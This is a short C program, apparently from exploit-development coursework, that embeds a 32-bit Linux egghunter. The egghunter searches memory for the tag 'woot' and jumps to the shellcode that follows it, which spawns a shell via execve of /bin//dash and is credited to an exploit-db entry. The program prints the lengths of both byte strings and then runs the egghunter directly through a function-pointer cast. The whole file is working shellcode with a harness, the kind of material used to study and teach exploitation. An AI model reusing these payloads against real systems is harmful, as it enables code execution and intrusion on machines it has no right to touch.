#include<stdio.h>
#include<string.h>

unsigned char egghunter[]= \
"\xfc\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x74\x6f\x6f\x77\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char shellcode[] = \
/** wootwoot **/
"\x74\x6f\x6f\x77\x74\x6f\x6f\x77"
/** shellcode from https://www.exploit-db.com/exploits/43476/ **/
"\x31\xc0\x50\x68\x64\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


int main(){

     printf("Egghunter Length:  %d\n", strlen(egghunter));
     printf("Shellcode Length:  %d\n", strlen(shellcode));


     (*(void  (*)()) egghunter)();
     return 0;
}
